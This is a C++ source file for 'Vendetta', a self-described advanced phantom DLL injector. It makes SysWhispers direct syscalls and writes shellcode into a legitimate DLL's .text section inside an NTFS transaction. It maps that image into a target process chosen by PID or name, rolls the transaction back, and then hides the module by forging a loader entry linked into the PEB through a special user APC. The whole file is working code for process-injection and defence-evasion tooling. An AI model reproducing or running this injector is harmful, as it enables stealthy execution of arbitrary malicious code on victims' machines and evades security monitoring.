#include <print>
#include <vector>
#include <syswhispers.h>
#include <TlHelp32.h>

#include "vendetta.h"
#include "pattern_scanner/voidstare.hpp"
#include "pattern_scanner/signatures.h"

#include "payload.h"

namespace vendetta
{
	namespace
	{
		bool execute_hijack_thread_apc_instant(const PROCESS_INFORMATION& pi,
		                                       const PPS_APC_ROUTINE
		                                       base_address,
		                                       const PVOID arg1 = nullptr,
		                                       const PVOID arg2 = nullptr,
		                                       const PVOID arg3 = nullptr)
		{
			NTSTATUS status;

			const HANDLE h_snap = CreateToolhelp32Snapshot(
				TH32CS_SNAPTHREAD, pi.dwProcessId);
			if (h_snap == INVALID_HANDLE_VALUE)
			{
				std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
				             GetLastError());
				return false;
			}

			THREADENTRY32 te32;
			te32.dwSize = sizeof(THREADENTRY32);
			if (!Thread32First(h_snap, &te32))
			{
				std::println("[-] Thread32First failed. Error = {}",
				             GetLastError());
				CloseHandle(h_snap);
				return false;
			}

			auto h_thread_hijacked = INVALID_HANDLE_VALUE;
			do
			{
				if (te32.th32OwnerProcessID == pi.dwProcessId)
				{
					CLIENT_ID client_id;
					client_id.UniqueProcess = UlongToHandle(te32.
						th32OwnerProcessID);
					client_id.UniqueThread = UlongToHandle(te32.
						th32ThreadID);

					OBJECT_ATTRIBUTES obj_attr = {};
					obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);

					status = Sw3NtOpenThread(&h_thread_hijacked,
					                         THREAD_ALL_ACCESS,
					                         &obj_attr, &client_id);
					if (!NT_SUCCESS(status))
					{
						std::println("[-] Sw3NtOpenThread failed. Error = {}",
						             status);
						CloseHandle(h_snap);
						return false;
					}
					break;
				}
			}
			while (Thread32Next(h_snap, &te32));
			if (h_thread_hijacked == INVALID_HANDLE_VALUE)
			{
				std::println(
					"[-] Sw3NtOpenThread failed. Error = no thread was found.");
				return false;
			}

			std::println(
				"[*] Queueing Apc with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC.TID = {}.",
				te32.th32ThreadID);
			status = Sw3NtQueueApcThreadEx(h_thread_hijacked,
			                               UlongToHandle(
				                               QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC),
			                               base_address,
			                               arg1, arg2, arg3);
			if (!NT_SUCCESS(status))
			{
				std::println("[-] Sw3NtQueueApcThreadEx failed. Error = {}",
				             status);
				CloseHandle(h_thread_hijacked);
				return false;
			}

			Sw3NtClose(h_thread_hijacked);
			return true;
		}

		bool link_module_to_peb(const PROCESS_INFORMATION& pi,
		                        const PVOID module_base_address,
		                        const PVOID module_entry_point,
		                        const ULONG image_size,
		                        const std::wstring& image_path)
		{
			// 1. Find LdrpInsertDataTableEntry
			Pattern ldrp_pattern(PATTERN_LDRP_INSERT_DATA_TABLE_ENTRY);
			PVOID remote_ldrp_func = voidStare::FindSignature(
				pi, L"ntdll.dll", ldrp_pattern);

			if (!remote_ldrp_func)
			{
				std::println("[-] Failed to find LdrpInsertDataTableEntry.");
				return false;
			}

			// 2. Prepare Names
			std::wstring base_name = image_path.substr(
				image_path.find_last_of('\\') + 1);
			std::wstring full_name = image_path;
			DWORD base_name_size = static_cast<DWORD>((base_name.length() + 1) *
				sizeof(wchar_t));
			DWORD full_name_size = static_cast<DWORD>((full_name.length() + 1) *
				sizeof(wchar_t));

			// 3. Allocation
			DWORD ddag_size = sizeof(LDR_DDAG_NODE);
			DWORD entry_size = sizeof(LDR_DATA_TABLE_ENTRY);
			DWORD total_size = entry_size + base_name_size + full_name_size +
				ddag_size;

			PVOID remote_memory = nullptr;
			SIZE_T region_size = total_size;

			NTSTATUS status = Sw3NtAllocateVirtualMemory(
				pi.hProcess, &remote_memory, 0,
				&region_size,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_READWRITE);
			if (!NT_SUCCESS(status))
			{
				std::println("[-] Allocation failed: {:x}", status);
				return false;
			}

			// 4. Calculate Pointers
			uintptr_t addr_entry = reinterpret_cast<uintptr_t>(remote_memory);
			uintptr_t addr_base_str = addr_entry + entry_size;
			uintptr_t addr_full_str = addr_base_str + base_name_size;
			uintptr_t addr_ddag = addr_full_str + full_name_size;

			// 5. Prepare Data
			LDR_DATA_TABLE_ENTRY local_entry = {nullptr};
			LDR_DDAG_NODE local_ddag = {nullptr};

			local_ddag.State = LdrModulesReadyToRun;
			local_ddag.LoadCount = 0xFFFFFFFF;
			local_ddag.Modules.Flink = reinterpret_cast<PLIST_ENTRY>(addr_ddag +
				offsetof(LDR_DDAG_NODE, Modules));
			local_ddag.Modules.Blink = reinterpret_cast<PLIST_ENTRY>(addr_ddag +
				offsetof(LDR_DDAG_NODE, Modules));

			local_entry.DllBase = module_base_address;
			local_entry.SizeOfImage = image_size;
			local_entry.EntryPoint = module_entry_point;
			local_entry.TlsIndex = 0;
			local_entry.ObsoleteLoadCount = 0xFFFF;
			local_entry.ReferenceCount = 0xFFFFFFFF;
			local_entry.Flags = 0x00084004;

			local_entry.BaseDllName.Length = static_cast<USHORT>(base_name_size
				- sizeof(wchar_t));
			local_entry.BaseDllName.MaximumLength = static_cast<USHORT>(
				base_name_size);
			local_entry.BaseDllName.Buffer = reinterpret_cast<PWSTR>(
				addr_base_str);

			local_entry.FullDllName.Length = static_cast<USHORT>(full_name_size
				- sizeof(wchar_t));
			local_entry.FullDllName.MaximumLength = static_cast<USHORT>(
				full_name_size);
			local_entry.FullDllName.Buffer = reinterpret_cast<PWSTR>(
				addr_full_str);

			local_entry.DdagNode = reinterpret_cast<PLDR_DDAG_NODE>(addr_ddag);
			local_entry.HashLinks.Flink = nullptr;
			local_entry.HashLinks.Blink = nullptr;

			// 6. Write Memory
			Sw3NtWriteVirtualMemory(pi.hProcess,
			                        reinterpret_cast<PVOID>(addr_entry),
			                        &local_entry, sizeof(LDR_DATA_TABLE_ENTRY),
			                        nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
			                        reinterpret_cast<PVOID>(addr_base_str),
			                        base_name.data(), base_name_size, nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
			                        reinterpret_cast<PVOID>(addr_full_str),
			                        full_name.data(), full_name_size, nullptr);
			Sw3NtWriteVirtualMemory(pi.hProcess,
			                        reinterpret_cast<PVOID>(addr_ddag),
			                        &local_ddag, sizeof(LDR_DDAG_NODE),
			                        nullptr);

			std::println(
				"[+] Memory allocated and LDR entry written.");

			if (!execute_hijack_thread_apc_instant(
				pi, static_cast<PPS_APC_ROUTINE>(remote_ldrp_func),
				reinterpret_cast<PVOID>(addr_entry)))
			{
				std::println("[-] Failed to queue apc for linking.");
				return false;
			}

			std::println(
				"[+] Linked successfully via direct LdrpInsertDataTableEntry call.");
			return true;
		}
	}

	bool inject_phantom_dll(const PROCESS_INFORMATION& pi, const BYTE* buf,
	                        SIZE_T buf_size,
	                        const std::wstring& legitimate_dll_path)
	{
		if (legitimate_dll_path.empty())
		{
			std::println("[-] Legitimate DLL path required for hollowing.");
			return false;
		}

		std::println("[*] Reading Legitimate DLL: {}",
		             std::string(legitimate_dll_path.begin(),
		                         legitimate_dll_path.end()));

		const HANDLE hFile = CreateFileW(legitimate_dll_path.c_str(),
		                                 GENERIC_READ, FILE_SHARE_READ,
		                                 nullptr, OPEN_EXISTING, 0,
		                                 nullptr);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			std::println("[-] Failed to open legitimate DLL: {}",
			             GetLastError());
			return false;
		}

		DWORD fileSize = GetFileSize(hFile, nullptr);
		std::vector<BYTE> pe_buffer(fileSize);
		DWORD bytesRead = 0;
		if (!ReadFile(hFile, pe_buffer.data(), fileSize, &bytesRead,
		              nullptr))
		{
			std::println("[-] ReadFile failed.");
			CloseHandle(hFile);
			return false;
		}
		CloseHandle(hFile);

		auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_buffer.data());
		if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return false;

		auto pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos
			->e_lfanew);
		if (pNt->Signature != IMAGE_NT_SIGNATURE) return false;

		auto pSection = IMAGE_FIRST_SECTION(pNt);
		PIMAGE_SECTION_HEADER pTextSection = nullptr;

		for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
		{
			if (strncmp(reinterpret_cast<char*>(pSection[i].Name), ".text",
			            5) == 0)
			{
				pTextSection = &pSection[i];
				break;
			}
		}

		if (!pTextSection)
		{
			std::println("[-] .text section not found in legitimate DLL.");
			return false;
		}

		if (buf_size > pTextSection->SizeOfRawData)
		{
			std::println(
				"[-] Shellcode ({} bytes) is too large for .text section ({} bytes).",
				buf_size, pTextSection->SizeOfRawData);
			return false;
		}

		HANDLE hTransaction;
		OBJECT_ATTRIBUTES obj_attr = {sizeof(OBJECT_ATTRIBUTES)};

		NTSTATUS status = Sw3NtCreateTransaction(
			&hTransaction,
			TRANSACTION_ALL_ACCESS,
			&obj_attr,
			nullptr, nullptr, 0, 0, 0, nullptr, nullptr
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtCreateTransaction failed: {:x}", status);
			return false;
		}
		std::println("[+] Transaction created.");

		HANDLE hTransactedFile = CreateFileTransactedW(
			legitimate_dll_path.c_str(),
			GENERIC_WRITE | GENERIC_READ,
			FILE_SHARE_READ,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			nullptr,
			hTransaction,
			nullptr,
			nullptr
		);
		if (hTransactedFile == INVALID_HANDLE_VALUE)
		{
			std::println("[-] CreateFileTransactedW failed: {}",
			             GetLastError());
			Sw3NtClose(hTransaction);
			return false;
		}

		std::println("[*] Patching .text section in memory...");
		memcpy(pe_buffer.data() + pTextSection->PointerToRawData, buf,
		       buf_size);

		std::println("[+] Writing patched PE content to transaction...");

		IO_STATUS_BLOCK io_status;
		LARGE_INTEGER byteOffset = {};

		status = Sw3NtWriteFile(
			hTransactedFile,
			nullptr, nullptr, nullptr,
			&io_status,
			pe_buffer.data(),
			static_cast<ULONG>(pe_buffer.size()),
			&byteOffset,
			nullptr
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtWriteFile failed: {:x}", status);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}

		// hTransactedFile validates headers (which are valid because they were copied from the real DLL)
		HANDLE hSection = nullptr;
		status = Sw3NtCreateSection(
			&hSection,
			SECTION_ALL_ACCESS,
			nullptr,
			nullptr,
			PAGE_READONLY,
			SEC_IMAGE,
			hTransactedFile
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtCreateSection failed: {:x}", status);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}

		PVOID remoteBase = nullptr;
		SIZE_T viewSize = 0;

		status = Sw3NtMapViewOfSection(
			hSection,
			pi.hProcess,
			&remoteBase,
			0, 0, nullptr,
			&viewSize,
			ViewUnmap,
			0,
			PAGE_EXECUTE_READ
		);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtMapViewOfSection failed: {:x}", status);
			Sw3NtClose(hSection);
			CloseHandle(hTransactedFile);
			Sw3NtClose(hTransaction);
			return false;
		}
		std::println("[+] Section created and mapped to the target process.");

		Sw3NtClose(hSection);
		CloseHandle(hTransactedFile); // Close Win32 handle with CloseHandle
		// Using Native Rollback
		status = Sw3NtRollbackTransaction(hTransaction, TRUE);
		if (!NT_SUCCESS(status))
		{
			std::println(
				"[-] Sw3NtRollbackTransaction failed (Warning): {:x}",
				status);
		}
		Sw3NtClose(hTransaction); // Close Native handle with Sw3NtClose
		std::println("[+] Transaction rolled back successfully.");

		std::println("[+] Mapped Base Address: {}", remoteBase);

		PVOID executionAddress = static_cast<PBYTE>(remoteBase) +
			pTextSection->
			VirtualAddress;

		std::println("[+] Linking phantom dll to PEB...");

		auto pNtRemote = reinterpret_cast<PIMAGE_NT_HEADERS>(
			pe_buffer.data() +
			pDos->e_lfanew);
		ULONG image_size = pNtRemote->OptionalHeader.SizeOfImage;

		if (!link_module_to_peb(pi, remoteBase, executionAddress, image_size,
		                        legitimate_dll_path))
		{
			std::println("[-] Failed to link phantom dll to PEB.");
			return false;
		}

		return true;
	}

	injector::~injector()
	{
		if (pi_.hThread && pi_.hThread != INVALID_HANDLE_VALUE)
			CloseHandle(
				pi_.hThread);
		if (pi_.hProcess && pi_.hProcess != INVALID_HANDLE_VALUE)
			CloseHandle(
				pi_.hProcess);
	}

	bool injector::create_dummy_process(const bool create_suspended)
	{
		if (!CreateProcessA(
			R"(..\dummy\dummy.exe)",
			nullptr, nullptr, nullptr, FALSE,
			create_suspended ? CREATE_SUSPENDED : 0,
			nullptr, nullptr, &si_, &pi_))
		{
			return false;
		}
		std::println("[*] Dummy process created. Pid = {}", pi_.dwProcessId);

		return true;
	}

	bool injector::attach_to_process(const DWORD pid)
	{
		CLIENT_ID client_id;
		client_id.UniqueProcess = UlongToHandle(pi_.dwProcessId);
		client_id.UniqueThread = nullptr;

		OBJECT_ATTRIBUTES obj_attr = { 0 };
		obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);

		NTSTATUS status = Sw3NtOpenProcess(
			&pi_.hProcess, PROCESS_ALL_ACCESS, &obj_attr,
			&client_id);
		if (!NT_SUCCESS(status))
		{
			std::println("[-] Sw3NtOpenProcess failed. Error = {}",
				status);
			return false;
		}
		if (pi_.hProcess == INVALID_HANDLE_VALUE)

		{
			std::println("[-] OpenProcess failed. Error = {}",
				GetLastError());
			return false;
		}
		return true;
	}

	bool injector::attach_to_process_by_name(const std::wstring& process_name)
	{
		std::string process_name_str(process_name.begin(),
		                             process_name.end());

		const HANDLE h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (h_snap == INVALID_HANDLE_VALUE)
		{
			std::println("[-] CreateToolhelp32Snapshot failed. Error = {}",
			             GetLastError());
			return false;
		}

		PROCESSENTRY32 pe32 = {0};
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(h_snap, &pe32))
		{
			std::println("[-] Process32First failed. Error = {}",
			             GetLastError());
			CloseHandle(h_snap);
			return false;
		}

		do
		{
			if (process_name == pe32.szExeFile)
			{
				std::println("[+] Found {}.", process_name_str);
				pi_.dwProcessId = pe32.th32ProcessID;
				break;
			}
		}
		while (Process32Next(h_snap, &pe32));
		CloseHandle(h_snap);
		if (pi_.dwProcessId == 0)
		{
			std::println("[-] Could not find {}.", process_name_str);
			return false;
		}

		attach_to_process(pe32.th32ProcessID);
		std::println("[+] Attached to {}. PID = {}.", process_name_str,
		             pe32.th32ProcessID);

		return true;
	}

	bool injector::inject(const std::wstring& benign_dll)
	const
	{
		return inject_phantom_dll(
			pi_, buf_, buf_size_, benign_dll);
	}
}


int main(int argc, char** argv)
{
	if (argc != 4)
	{
		std::println("Usage: vendetta.exe -p <pid> <dll path>");
		std::println("       vendetta.exe -n <process name> <dll path>");
		return 1;
	}

	{
		std::println(
			R"(____   ____                 .___      __    __          
\   \ /   /____   ____    __| _/_____/  |__/  |______   
 \   Y   // __ \ /    \  / __ |/ __ \   __\   __\__  \  
  \     /\  ___/|   |  \/ /_/ \  ___/|  |  |  |  / __ \_
   \___/  \___  >___|  /\____ |\___  >__|  |__| (____  /
                                                     \/ 
        .------------------------------------.          
        |Advanced Phantom DLL injector v1.0.0|          
        |      Author: (wichtigerlelek)      |          
        '------------------------------------'          )");
	}

	const std::string option(argv[1]);
	std::string target(argv[2]);

	std::string dll_path_str = argv[3];
	const std::wstring dll_path = std::wstring(dll_path_str.begin(),
	                                     dll_path_str.end());

	vendetta::injector inj(shellc_hello);

	if (option == "-p")
	{
		DWORD pid;
		try
		{
			pid = std::stoul(target);
		}
		catch (const std::exception&)
		{
			std::println("[-] Invalid PID. Must be a number.");
			return 1;
		}

		if (!inj.attach_to_process(pid))
		{
			std::println("[-] Failed to attach to process by PID.");
			return 1;
		}
	}
	else if (option == "-n")
	{
		std::wstring process_name(target.begin(), target.end());

		if (!inj.attach_to_process_by_name(process_name))
		{
			std::println("[-] Failed to attach to process by name.");
			return 1;
		}
	}
	else
	{
		std::println("[-] Invalid option. Use -p for PID or -n for process name.");
		return 1;
	}

	if (!inj.inject(dll_path))
	{
		std::println("[-] Injection failed.");
		return 1;
	}

	std::println("[+] Done.");
	return 0;
}
